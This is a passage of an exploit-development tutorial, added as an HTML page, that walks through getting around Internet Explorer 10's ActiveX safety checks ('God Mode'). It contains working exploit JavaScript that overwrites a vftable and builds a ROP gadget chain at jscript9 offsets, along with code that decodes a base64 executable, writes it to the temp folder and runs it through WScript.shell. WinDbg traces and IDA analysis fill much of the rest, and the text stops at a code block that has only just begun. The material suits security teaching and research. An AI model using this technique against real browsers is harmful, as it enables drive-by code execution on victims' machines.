@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IE10: God Mode (2)</title>
+    <link rel="stylesheet" href="styles.css">
+
+    <link rel="stylesheet" href="highlight/styles/stackoverflow-dark.min.css">
+    <script src="highlight/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<div class="inner-content"><header class="page-header"><h1 class="page-title">IE10: God Mode (2)</h1></header><div class="page-content"><h2>Fixing the God Mode</h2><p>Before doing something radical, let’s try to find out where the crash is. To do this, let’s add a few alerts:</p>
+
+<pre><code class="language-js">    function createExe(fname, data) {
+      alert("3");           // &lt;------------------------------------------
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      alert("4");           // &lt;------------------------------------------
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+      tStream.Close();
+      bStream.Close();
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+      // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+ 
+    alert("1");         // &lt;------------------------------------------
+    shell = new ActiveXObject("WScript.shell");
+    alert("2");         // &lt;------------------------------------------
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    createExe(fname, decode(runcalc));
+    shell.Exec(fname);
+
+    write(mshtml+0xc555e0+0x14, old);      // God mode off!
+
+    alert("All done!");
+</code></pre>
+    
+    <p>Now reload the page in IE (by going to <span style="color: #00ff00;">127.0.0.1</span>), change the length of the <span style="color: #00ff00;">Int32Array</span> at <span style="color: #00ff00;">0xc0af000</span> and see what happens. You should see all the three alert box from <span style="color: #00ff00;">1</span> to <span style="color: #00ff00;">3</span> and then the crash. Therefore, we can conclude that the crash happens when we execute the following instructions:</p>
+    
+<pre><code class="language-js">      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+</code></pre>
+      
+      <p>Why isn’t there any problem with <span style="color: #00ff00;">WScript.shell</span>?</p><p>A difference should come to mind: <span style="color: #00ff00;">ADODB.Stream</span> was disabled by Microsoft! Maybe something happens in <span style="color: #00ff00;">jscript9!ScriptSite::CreateObjectFromProgID</span>… Let’s see.</p><p>Repeat the process and this time, when the alert box with <span style="color: #00ff00;">3</span> appears, put a breakpoint on <span style="color: #00ff00;">jscript9!ScriptSite::CreateObjectFromProgID</span>. Let’s do some stepping inside <span style="color: #00ff00;">CreateObjectFromProgID</span>:</p><pre class="ignore:true">jscript9!ScriptSite::CreateObjectFromProgID:
+04f3becb 8bff            mov     edi,edi
+04f3becd 55              push    ebp
+04f3bece 8bec            mov     ebp,esp
+04f3bed0 83ec34          sub     esp,34h
+04f3bed3 a144630f05      mov     eax,dword ptr [jscript9!__security_cookie (050f6344)]
+04f3bed8 33c5            xor     eax,ebp
+04f3beda 8945fc          mov     dword ptr [ebp-4],eax
+04f3bedd 53              push    ebx
+04f3bede 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
+04f3bee1 56              push    esi
+04f3bee2 33c0            xor     eax,eax
+04f3bee4 57              push    edi
+04f3bee5 8b7d08          mov     edi,dword ptr [ebp+8]
+04f3bee8 8bf2            mov     esi,edx
+04f3beea 8975dc          mov     dword ptr [ebp-24h],esi
+04f3beed 8945cc          mov     dword ptr [ebp-34h],eax
+04f3bef0 897dd0          mov     dword ptr [ebp-30h],edi
+04f3bef3 8945d4          mov     dword ptr [ebp-2Ch],eax
+04f3bef6 8945d8          mov     dword ptr [ebp-28h],eax
+04f3bef9 8945e8          mov     dword ptr [ebp-18h],eax
+04f3befc 85ff            test    edi,edi
+04f3befe 0f85e26a1600    jne     jscript9!memset+0xf390 (050a29e6)
+04f3bf04 8b4604          mov     eax,dword ptr [esi+4]
+04f3bf07 e8d5000000      call    jscript9!ScriptEngine::InSafeMode (04f3bfe1)
+04f3bf0c 85c0            test    eax,eax
+04f3bf0e 8d45ec          lea     eax,[ebp-14h]
+04f3bf11 50              push    eax
+04f3bf12 51              push    ecx
+04f3bf13 0f84d86a1600    je      jscript9!memset+0xf39b (050a29f1)
+04f3bf19 ff1508400e05    call    dword ptr [jscript9!_imp__CLSIDFromProgID (050e4008)]
+04f3bf1f 85c0            test    eax,eax
+04f3bf21 0f88e867fcff    js      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04f0270f)
+04f3bf27 8d45ec          lea     eax,[ebp-14h]
+04f3bf2a 50              push    eax
+04f3bf2b 8b4604          mov     eax,dword ptr [esi+4] ds:002b:02facc44=02f8c480
+04f3bf2e e8e2030000      call    jscript9!ScriptEngine::CanCreateObject (04f3c315)   &lt;------------------
+04f3bf33 85c0            test    eax,eax       &lt;------------------ EAX = 0
+04f3bf35 0f84d467fcff    je      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04f0270f)  &lt;----- je taken!
+.
+.
+.
+04f0270f bead010a80      mov     esi,800A01ADh
+04f02714 e99d980300      jmp     jscript9!ScriptSite::CreateObjectFromProgID+0xe3 (04f3bfb6)
+.
+.
+.
+04f3bfb6 8b4dfc          mov     ecx,dword ptr [ebp-4] ss:002b:03feb55c=91c70f95
+04f3bfb9 5f              pop     edi
+04f3bfba 8bc6            mov     eax,esi
+04f3bfbc 5e              pop     esi
+04f3bfbd 33cd            xor     ecx,ebp
+04f3bfbf 5b              pop     ebx
+04f3bfc0 e87953f2ff      call    jscript9!__security_check_cookie (04e6133e)
+04f3bfc5 c9              leave
+04f3bfc6 c20800          ret     8</pre><p>As we can see, <span style="color: #00ff00;">CanCreateObject</span> returns <span style="color: #00ff00;">0</span> and our familiar <span style="color: #00ff00;">CanObjectRun</span> is not even called. What happens if we force <span style="color: #00ff00;">CanCreateObject </span>to return <span style="color: #00ff00;">true</span> (<span style="color: #00ff00;">EAX = 1</span>)? Try to repeat the whole process, but this time, right after the call to <span style="color: #00ff00;">CanCreateObject</span>, set <span style="color: #00ff00;">EAX</span> to <span style="color: #00ff00;">1</span> (use <span style="color: #00ff00;">r eax=1</span>). Remember that you need to do that twice because we create two <span style="color: #00ff00;">ADODB.Stream</span> objects.</p><p>Now the alert box with <span style="color: #00ff00;">4</span> appears but we have a crash after we close it. Why don’t we try to keep the <em>God Mode</em> enabled only when strictly necessary? Let’s change the code as follows:</p>
+
+<pre><code class="language-js">    var old = read(mshtml+0xc555e0+0x14);
+
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      write(mshtml+0xc555e0+0x14, old);                   // God mode off!
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      bStream.SaveToFile(fname, 2);       // 2 = overwrites file if it already exists
+      tStream.Close();
+      bStream.Close();
+    }
+    
+    function decode(b64Data) {
+      var data = window.atob(b64Data);
+      
+      // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+ 
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+    shell = new ActiveXObject("WScript.shell");
+    write(mshtml+0xc555e0+0x14, old);                   // God mode off!
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    createExe(fname, decode(runcalc));
+    shell.Exec(fname);
+
+    alert("All done!");
+</code></pre>
+    
+    <p>Let’s try again to load the page and set <span style="color: #00ff00;">EAX</span> to <span style="color: #00ff00;">1</span> right after <span style="color: #00ff00;">CanCreateObject</span>. This time, let’s put the breakpoint directly on <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true">bp jscript9!ScriptEngine::CanCreateObject</pre><p>When the breakpoint is triggered, hit <span style="color: #00ff00;">Shift+F11</span> and then set <span style="color: #00ff00;">EAX</span> to <span style="color: #00ff00;">1</span> (the first time it’s already <span style="color: #00ff00;">1</span>). OK, now there is no crash but the calculator doesn’t appear. If you repeat the process with the <span style="color: #00ccff;">Developer Tools</span> enabled, you should see the following error:</p><p>
+<a href="images/pic_37.png"><img src="images/pic_37.png" alt="pic_37" width="1152" height="723"></a>
+    <br> Let’s leave that error for later. For now we should be happy that we (almost) solved the problem with the <em>God Mode</em>. We still need to modify the behavior of <span style="color: #00ff00;">CanCreateObject</span> somehow so that it always returns true. Again, repeat the whole process and put a breakpoint on <span style="color: #00ff00;">CanCreateObject</span>. When the breakpoint is triggered, we can begin to examine <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true ">jscript9!ScriptEngine::CanCreateObject:
+04dcc315 8bff            mov     edi,edi
+04dcc317 55              push    ebp
+04dcc318 8bec            mov     ebp,esp
+04dcc31a 51              push    ecx
+04dcc31b 51              push    ecx
+04dcc31c 57              push    edi
+04dcc31d 8bf8            mov     edi,eax
+04dcc31f f687e401000008  test    byte ptr [edi+1E4h],8
+04dcc326 743d            je      jscript9!ScriptEngine::CanCreateObject+0x50 (04dcc365)
+04dcc328 8d45fc          lea     eax,[ebp-4]
+04dcc32b 50              push    eax
+04dcc32c e842000000      call    jscript9!ScriptEngine::GetSiteHostSecurityManagerNoRef (04dcc373)
+04dcc331 85c0            test    eax,eax
+04dcc333 7835            js      jscript9!ScriptEngine::CanCreateObject+0x55 (04dcc36a) [br=0]
+04dcc335 8b45fc          mov     eax,dword ptr [ebp-4]
+04dcc338 8b08            mov     ecx,dword ptr [eax]        &lt;------------------ ecx = object.vftptr
+04dcc33a 6a00            push    0
+04dcc33c 6a00            push    0
+04dcc33e 6a10            push    10h
+04dcc340 ff7508          push    dword ptr [ebp+8]
+04dcc343 8d55f8          lea     edx,[ebp-8]
+04dcc346 6a04            push    4
+04dcc348 52              push    edx                                            +---------------------
+04dcc349 6800120000      push    1200h                                          |
+04dcc34e 50              push    eax                                            v
+04dcc34f ff5110          call    dword ptr [ecx+10h]  ds:002b:6ac755f0={MSHTML!TearoffThunk4 (6a25604a)}
+04dcc352 85c0            test    eax,eax
+04dcc354 7814            js      jscript9!ScriptEngine::CanCreateObject+0x55 (04dcc36a)
+04dcc356 f645f80f        test    byte ptr [ebp-8],0Fh
+04dcc35a 6a00            push    0
+04dcc35c 58              pop     eax
+04dcc35d 0f94c0          sete    al
+04dcc360 5f              pop     edi
+04dcc361 c9              leave
+04dcc362 c20400          ret     4</pre><p>Look at the virtual call at <span style="color: #00ff00;">04dcc34f</span>: we can use the same trick we used with <span style="color: #00ff00;">CanObjectRun</span>! As before, <span style="color: #00ff00;">ECX</span> points to a vftable:</p><pre class="ignore:true">0:007&gt; dds ecx
+6ac755e0  6a0b2681 MSHTML!PlainQueryInterface
+6ac755e4  6a0b25a1 MSHTML!CAPProcessor::AddRef
+6ac755e8  6a08609d MSHTML!PlainRelease
+6ac755ec  6a078eb5 MSHTML!TearoffThunk3
+6ac755f0  6a25604a MSHTML!TearoffThunk4           &lt;----------- we need to modify this for CanCreateObject
+6ac755f4  04dcc164 jscript9!ScriptEngine::CanObjectRun+0xaf   &lt;---------- this is our fix for CanObjectRun!
+6ac755f8  6a129a77 MSHTML!TearoffThunk6
+6ac755fc  6a201a73 MSHTML!TearoffThunk7
+6ac75600  6a12770c MSHTML!TearoffThunk8
+6ac75604  6a12b22c MSHTML!TearoffThunk9
+6ac75608  6a12b1e3 MSHTML!TearoffThunk10
+6ac7560c  6a257db5 MSHTML!TearoffThunk11
+6ac75610  6a12b2b8 MSHTML!TearoffThunk12
+6ac75614  6a332a3d MSHTML!TearoffThunk13
+6ac75618  6a242719 MSHTML!TearoffThunk14
+6ac7561c  6a254879 MSHTML!TearoffThunk15
+6ac75620  6a12b637 MSHTML!TearoffThunk16
+6ac75624  6a131bf3 MSHTML!TearoffThunk17
+6ac75628  6a129649 MSHTML!TearoffThunk18
+6ac7562c  6a4a8422 MSHTML!TearoffThunk19
+6ac75630  6a58bc4a MSHTML!TearoffThunk20
+6ac75634  6a1316d9 MSHTML!TearoffThunk21
+6ac75638  6a2e7b23 MSHTML!TearoffThunk22
+6ac7563c  6a212734 MSHTML!TearoffThunk23
+6ac75640  6a2e75ed MSHTML!TearoffThunk24
+6ac75644  6a4c28c5 MSHTML!TearoffThunk25
+6ac75648  6a3c5a7d MSHTML!TearoffThunk26
+6ac7564c  6a3a6310 MSHTML!TearoffThunk27
+6ac75650  6a3bff2d MSHTML!TearoffThunk28
+6ac75654  6a3aa803 MSHTML!TearoffThunk29
+6ac75658  6a3cd81a MSHTML!TearoffThunk30
+6ac7565c  6a223f19 MSHTML!TearoffThunk31</pre><p>As you can see, that’s the same vftable we modified for <span style="color: #00ff00;">CanObjectRun</span>. Now we need to modify <span style="color: #00ff00;">[ecx+10h]</span> for <span style="color: #00ff00;">CanCreateObject</span>. We might try to overwrite <span style="color: #00ff00;">[ecx+10h]</span> with the address of the <span style="color: #00ccff;">epilog</span> of <span style="color: #00ff00;">CanCreateObject</span>, but it won’t work. The problem is that we need to zero out <span style="color: #00ff00;">EDI</span> before returning from <span style="color: #00ff00;">CanCreateObject</span>. Here’s the code right after the call to <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true">04ebbf2e e8e2030000      call    jscript9!ScriptEngine::CanCreateObject (04ebc315)
+04ebbf33 85c0            test    eax,eax
+04ebbf35 0f84d467fcff    je      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04e8270f)
+04ebbf3b 6a05            push    5
+04ebbf3d 58              pop     eax
+04ebbf3e 85ff            test    edi,edi
+04ebbf40 0f85b66a1600    jne     jscript9!memset+0xf3a6 (050229fc)      &lt;----------------- taken if EDI != 0</pre><p>If the <span style="color: #00ff00;">jne</span> is taken, <span style="color: #00ff00;">CreateObjectFromProgID</span> and <span style="color: #00ff00;">CreateActiveXObject</span> will fail.</p><p>I looked for hours but I couldn’t find any suitable code to call. Something like</p>
+
+<pre><code class="language-x86asm">xor   edi, edi
+leave
+ret   4
+</code></pre>
+
+<p>would be perfect, but it just doesn’t exist. I looked for any variations I could think of, but to no avail. I also looked for</p>
+
+<pre><code class="language-x86asm">mov   dword ptr [edx], 0
+ret   20h
+</code></pre>
+
+<p>and variations. This code would mimic a <span style="color: #00ff00;">call</span> to the original virtual function and clear<span style="color: #00ff00;"> [ebp-8]</span>. This way, <span style="color: #00ff00;">CanCreateObject</span> would return true:</p><pre class="ignore:true">04dcc338 8b08            mov     ecx,dword ptr [eax]
+04dcc33a 6a00            push    0
+04dcc33c 6a00            push    0
+04dcc33e 6a10            push    10h
+04dcc340 ff7508          push    dword ptr [ebp+8]
+04dcc343 8d55f8          lea     edx,[ebp-8]      &lt;---------- edx = ebp-8
+04dcc346 6a04            push    4
+04dcc348 52              push    edx
+04dcc349 6800120000      push    1200h
+04dcc34e 50              push    eax
+04dcc34f ff5110          call    dword ptr [ecx+10h]  ds:002b:6ac755f0={MSHTML!TearoffThunk4 (6a25604a)}
+04dcc352 85c0            test    eax,eax
+04dcc354 7814            js      jscript9!ScriptEngine::CanCreateObject+0x55 (04dcc36a)
+04dcc356 f645f80f        test    byte ptr [ebp-8],0Fh      &lt;-------- if [ebp-8] == 0, then ...
+04dcc35a 6a00            push    0
+04dcc35c 58              pop     eax
+04dcc35d 0f94c0          sete    al                 &lt;-------- ... then EAX = 1
+04dcc360 5f              pop     edi                &lt;-------- restores EDI (it was 0)
+04dcc361 c9              leave
+04dcc362 c20400          ret     4</pre><p>Note that this would also clear <span style="color: #00ff00;">EDI</span>, because <span style="color: #00ff00;">EDI</span> was <span style="color: #00ff00;">0</span> when <span style="color: #00ff00;">CanCreateObject</span> was called.</p><p>Next, I tried to do some <span style="color: #00ccff;">ROP</span>. I looked for something like this:</p>
+
+<pre><code class="language-x86asm">xchg  ecx, esp
+ret
+</code></pre>
+
+<p>Unfortunately, I couldn’t find anything similar. If only we could control some other register beside <span style="color: #00ff00;">ECX</span>…</p><p>Well, it turns out that we can control <span style="color: #00ff00;">EAX</span> and <span style="color: #00ff00;">xchg eax, esp</span> <span style="color: #00ccff;">gadgets</span> are certainly more common than <span style="color: #00ff00;">xchg ecx, esp</span> gadgets.</p><p>Here’s the schema we’re going to use:</p><p>
+<a href="images/pic_38b.png"><img src="images/pic_38b.png" alt="pic_38b" width="1227" height="558"></a>
+<br> We already know that <span style="color: #00ff00;">CanCreateObject</span> and <span style="color: #00ff00;">CanObjectRun</span> call virtual functions from the same VFTable. You can easily verify that not only do they call virtual functions from the same VFTable, but they call them on the same object. This is also shown in the scheme above.</p><p>Let’s look again at the relevant code in <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true">04dcc338 8b08            mov     ecx,dword ptr [eax]  &lt;----------- we control EAX, which points to "object"
+04dcc33a 6a00            push    0            &lt;----------- now, ECX = object."vftable ptr"
+04dcc33c 6a00            push    0
+04dcc33e 6a10            push    10h
+04dcc340 ff7508          push    dword ptr [ebp+8]
+04dcc343 8d55f8          lea     edx,[ebp-8]
+04dcc346 6a04            push    4
+04dcc348 52              push    edx
+04dcc349 6800120000      push    1200h
+04dcc34e 50              push    eax
+04dcc34f ff5110          call    dword ptr [ecx+10h]  &lt;----------- call to gadget 1 (in the picture)
+04dcc352 85c0            test    eax,eax
+04dcc354 7814            js      jscript9!ScriptEngine::CanCreateObject+0x55 (04dcc36a)
+04dcc356 f645f80f        test    byte ptr [ebp-8],0Fh
+04dcc35a 6a00            push    0
+04dcc35c 58              pop     eax
+04dcc35d 0f94c0          sete    al
+04dcc360 5f              pop     edi
+04dcc361 c9              leave        &lt;----------- this is gadget 4
+04dcc362 c20400          ret     4</pre><p>The first gadget, when called, make <span style="color: #00ff00;">ESP</span> point to <span style="color: #00ff00;">object+4</span> and returns to gadget <span style="color: #00ff00;">2</span>. After gadget <span style="color: #00ff00;">2</span> and <span style="color: #00ff00;">3</span>, <span style="color: #00ff00;">EDI</span> is <span style="color: #00ff00;">0</span> and <span style="color: #00ff00;">EAX</span> non-zero. Gadget <span style="color: #00ff00;">4</span> restores <span style="color: #00ff00;">ESP</span> and returns from <span style="color: #00ff00;">CanCreateObject</span>.</p><p>Here’s the javascript code to set up object and vftable like in the picture above:</p>
+
+<pre><code class="language-js">    //                                                  vftable
+    //                                    +-----&gt; +------------------+
+    //                                    |       |                  |
+    //                                    |       |                  |
+    //                                    |  0x10:| jscript9+0x10705e| --&gt; "XCHG EAX,ESP | ADD EAX,71F84DC0 |
+    //                                    |       |                  |      MOV EAX,ESI | POP ESI | RETN"
+    //                                    |  0x14:| jscript9+0xdc164 | --&gt; "LEAVE | RET 4"
+    //                                    |       +------------------+
+    //                 object             |
+    // EAX ---&gt; +-------------------+     |
+    //          | vftptr            |-----+
+    //          | jscript9+0x15f800 | --&gt; "XOR EAX,EAX | RETN"
+    //          | jscript9+0xf3baf  | --&gt; "XCHG EAX,EDI | RETN"
+    //          | jscript9+0xdc361  | --&gt; "LEAVE | RET 4"
+    //          +-------------------+
+
+    // If we do "write(pp_obj, X)", we'll have EAX = X in CanCreateObject
+    var pp_obj = ... ptr to ptr to object ...
+    
+    var old_objptr = read(pp_obj);
+    var old_vftptr = read(old_objptr);
+    
+    // Create the new vftable.
+    var new_vftable = new Int32Array(0x708/4);
+    for (var i = 0; i &lt; new_vftable.length; ++i)
+      new_vftable[i] = read(old_vftptr + i*4);
+    new_vftable[0x10/4] = jscript9+0x10705e;
+    new_vftable[0x14/4] = jscript9+0xdc164;
+    var new_vftptr = read(get_addr(new_vftable) + 0x1c);        // ptr to raw buffer of new_vftable
+    
+    // Create the new object.
+    var new_object = new Int32Array(4);
+    new_object[0] = new_vftptr;
+    new_object[1] = jscript9 + 0x15f800;
+    new_object[2] = jscript9 + 0xf3baf;
+    new_object[3] = jscript9 + 0xdc361;
+    var new_objptr = read(get_addr(new_object) + 0x1c);         // ptr to raw buffer of new_object
+    
+    function GodModeOn() {
+      write(pp_obj, new_objptr);
+    }
+    
+    function GodModeOff() {
+      write(pp_obj, old_objptr);
+    }
+</code></pre>
+    
+    <p>The code should be easy to understand. We create <span style="color: #00ff00;">object</span> (<span style="color: #00ff00;">new_object</span>) and <span style="color: #00ff00;">vftable</span> (<span style="color: #00ff00;">new_vftable</span>) by using two <span style="color: #00ff00;">Int32Arrays</span> (in particular, their raw buffers) and make <span style="color: #00ff00;">object</span> point to <span style="color: #00ff00;">vftable</span>. Note that our vftable is a modified copy of the old vftable. Maybe there’s no need to make a copy of the old vftable because only the two modified fields (at offsets <span style="color: #00ff00;">0x10</span> and <span style="color: #00ff00;">0x14</span>) are used, but that doesn’t hurt.</p><p>We can now enable the <em>God Mode</em> by making <span style="color: #00ff00;">EAX</span> point to our object and disable the <em>God Mode</em> by making <span style="color: #00ff00;">EAX</span> point to the original object.</p><h2>Controlling EAX</h2><p>To see if we can control <span style="color: #00ff00;">EAX</span>, we need to find out where the value of <span style="color: #00ff00;">EAX</span> comes from. I claimed that <span style="color: #00ff00;">EAX</span> can be controlled and showed how we can exploit this to do some ROP. Now it’s time for me to show you exactly how <span style="color: #00ff00;">EAX</span> can be controlled. In reality, this should be the first thing you do. First you determine if you can control something and only then write code for it.</p><p>It’s certainly possible to do the kind of analysis required for this task in WinDbg, but <span style="color: #00ccff;">IDA Pro</span> is way better for this. If you don’t own a copy of IDA Pro, download the free version (<a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">link</a>).</p><p>IDA is a very smart disassembler. Its main feature is that it’s <em>interactive</em>, that is, once IDA has finished disassembling the code, you can edit and manipulate the result. For instance, you can correct mistakes made by IDA, add <em>comments</em>, define <em>structures</em>, change <em>names</em>, etc…</p><p>If you want a career in <span style="color: #00ccff;">Malware Analysis</span> or <span style="color: #00ccff;">Exploit Development</span>, you should get really comfortable with IDA and buy the Pro version.</p><p><span style="color: #00ff00;">CanCreateObject</span> is in <span style="color: #00ff00;">jscript9</span>. Let’s find out the path of this module in WinDbg:</p><pre class="ignore:true">0:015&gt; lmf m jscript9
+start    end        module name
+71c00000 71ec6000   jscript9 C:\Windows\SysWOW64\jscript9.dll</pre><p>Open <span style="color: #00ff00;">jscript9.dll</span> in IDA and, if needed, specify the path for the database created by IDA. When asked, allow IDA to download <span style="color: #00ccff;">symbols</span> for <span style="color: #00ff00;">jscript9.dll</span>. Press <span style="color: #00ff00;">CTRL+P</span> (<span style="color: #00ff00;">Jump to function</span>), click on <span style="color: #00ff00;">Search</span> and enter <span style="color: #00ff00;">CanCreateObject</span>. Now <span style="color: #00ff00;">CanCreateObject</span> should be selected like shown in the following picture:</p><p>
+<a href="images/pic_39.png"><img src="images/pic_39.png" alt="pic_39" width="1300" height="645"></a>
+<br> After you double click on <span style="color: #00ff00;">CanCreateObject</span> you should see the graph of the function <span style="color: #00ff00;">CanCreateObject</span>. If you see linear code, hit the spacebar. To rename a symbol, click on it and press <span style="color: #00ff00;">n</span>. IDA has a very useful feature: when some text is selected, all occurrences of that text are highlighted. This is useful to track things down.</p><p>Have a look at the following picture:</p><p>
+<a href="images/pic_40.png"><img src="images/pic_40.png" alt="pic_40" width="1482" height="1035"></a>
+<br> It’s quite clear that <span style="color: #00ff00;">[ebp+object]</span> (note that I renamed <span style="color: #00ff00;">var_4</span> to <span style="color: #00ff00;">object</span>) is modified inside <span style="color: #00ff00;">?GetSiteHostSecurityManagerNoRef</span>. Let’s have a look at that function:</p><p>
+<a href="images/pic_41.png"><img src="images/pic_41.png" alt="pic_41" width="1447" height="1648"></a>
+<br> As we can see, our variable <span style="color: #00ff00;">object</span> is overwritten with <span style="color: #00ff00;">[edi+1F0h]</span>. We also see that if <span style="color: #00ff00;">[edi+1F0h]</span> is <span style="color: #00ff00;">0</span>, it’s initialized. We need to keep this fact in mind for later. Now that we know that we need to track <span style="color: #00ff00;">edi</span>, let’s look again at <span style="color: #00ff00;">CanCreateObject</span>:</p><p>
+<a href="images/pic_42.png"><img src="images/pic_42.png" alt="pic_42" width="1484" height="1040"></a>
+<br> To see what code calls <span style="color: #00ff00;">CanCreateObject</span>, click somewhere where indicated in the picture above and press <span style="color: #00ff00;">CTRL+X</span>. Then select the only function shown. We’re now in <span style="color: #00ff00;">CreateObjectFromProgID</span>:</p><p>
+<a href="images/pic_43.png"><img src="images/pic_43.png" alt="pic_43" width="1275" height="1574"></a>
+<br> This is what we’ve learned so far:</p><pre class="ignore:true">esi = edx
+eax = [esi+4]
+edi = eax
+object = [edi+1f0h]</pre><p>Now we need to go to the caller of <span style="color: #00ff00;">CreateObjectFromProgID</span> and follow <span style="color: #00ff00;">EDX</span>. To do that, click somewhere on the signature of <span style="color: #00ff00;">CreateObjectFromProgID</span> and press <span style="color: #00ff00;">CTRL+X</span>. You should see two options: of course, select <span style="color: #00ff00;">CreateActiveXObject</span>. Now we’re inside <span style="color: #00ff00;">CreateActiveXObject</span>:</p><p>
+<a href="images/pic_44.png"><img src="images/pic_44.png" alt="pic_44" width="1691" height="1073"></a>
+<br> Let’s update our little schema:</p><pre class="ignore:true">esi = arg0
+edx = esi
+esi = edx
+eax = [esi+4]
+edi = eax
+object = [edi+1f0h]</pre><p>Now we need to follow the first argument passed to <span style="color: #00ff00;">CreateActiveXObject</span>. As before, let’s go to the code which calls <span style="color: #00ff00;">CreateActiveXObject</span>. Look at the following picture (note that I grouped some nodes together to make the graph more compact):</p><p>
+<a href="images/pic_45.png"><img src="images/pic_45.png" alt="pic_45" width="2155" height="1375"></a>
+<br> After this, the complete schema is the following:</p><pre class="ignore:true">eax = arg_0
+eax = [eax+28h]
+edx = eax
+esi = edx
+eax = [esi+4]
+edi = eax
+object = [edi+1f0h]</pre><p>Now we must follow the first argument passed to <span style="color: #00ff00;">JavascriptActiveXObject::NewInstance</span>. When we click on its signature and press <span style="color: #00ff00;">CTRL+X</span> we’re shown references which doesn’t look familiar. It’s time to go back in WinDbg.</p><p>Open in IE a page with this code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  alert("Start");
+  shell = new ActiveXObject("WScript.shell");
+  shell.Exec('calc.exe');
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Put a breakpoint on <span style="color: #00ff00;">CanCreateObject</span>:</p><pre class="ignore:true">bp jscript9!ScriptEngine::CanCreateObject</pre><p>When the breakpoint is triggered, let’s step out of the current function by pressing <span style="color: #00ff00;">Shift+F11</span>, until we are in <span style="color: #00ff00;">jscript9!Js::InterpreterStackFrame::NewScObject_Helper</span>. You’ll see the following:</p><pre class="ignore:true">045725c4 890c82          mov     dword ptr [edx+eax*4],ecx
+045725c7 40              inc     eax
+045725c8 3bc6            cmp     eax,esi
+045725ca 72f5            jb      jscript9!Js::InterpreterStackFrame::NewScObject_Helper+0xc2 (045725c1)
+045725cc ff75ec          push    dword ptr [ebp-14h]
+045725cf ff75e8          push    dword ptr [ebp-18h]
+045725d2 ff55e4          call    dword ptr [ebp-1Ch]
+045725d5 8b65e0          mov     esp,dword ptr [ebp-20h] ss:002b:03a1bc00=03a1bbe4   &lt;--------- we're here!
+045725d8 8945d8          mov     dword ptr [ebp-28h],eax
+045725db 8b4304          mov     eax,dword ptr [ebx+4]
+045725de 83380d          cmp     dword ptr [eax],0Dh</pre><p>We can see why IDA wasn’t able to track this call: it’s a <span style="color: #00ccff;">dynamic call</span>, meaning that the destination of the call is not static. Let’s examine the first argument:</p><pre class="ignore:true">0:007&gt; dd poi(ebp-18)
+032e1150  045e2b70 03359ac0 03355520 00000003
+032e1160  00000000 ffffffff 047c4de4 047c5100
+032e1170  00000037 00000000 02cc4538 00000000
+032e1180  0453babc 00000000 00000001 00000000
+032e1190  00000000 032f5410 00000004 00000000
+032e11a0  00000000 00000000 00000000 00000000
+032e11b0  04533600 033598c0 033554e0 00000003
+032e11c0  00000000 ffffffff 047c4de4 047c5660</pre><p>The first value might be a pointer to a vftable. Let’s see:</p><pre class="ignore:true">0:007&gt; ln 045e2b70
+(045e2b70)   jscript9!JavascriptActiveXFunction::`vftable'   |  (04534218)   jscript9!Js::JavascriptSafeArrayObject::`vftable'
+Exact matches:
+    jscript9!JavascriptActiveXFunction::`vftable' = &lt;no type information&gt;</pre><p>And indeed, we’re right! More important, <span style="color: #00ff00;">JavascriptActiveXFunction</span> is the function <span style="color: #00ff00;">ActiveXObject</span> we use to create <span style="color: #00ccff;">ActiveX</span> objects! That’s our starting point. So the complete schema is the following:</p><pre class="ignore:true">X = address of ActiveXObject
+X = [X+28h]
+X = [X+4]
+object = [X+1f0h]</pre><p>Let’s verify that our findings are correct. To do so, use the following javascript code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
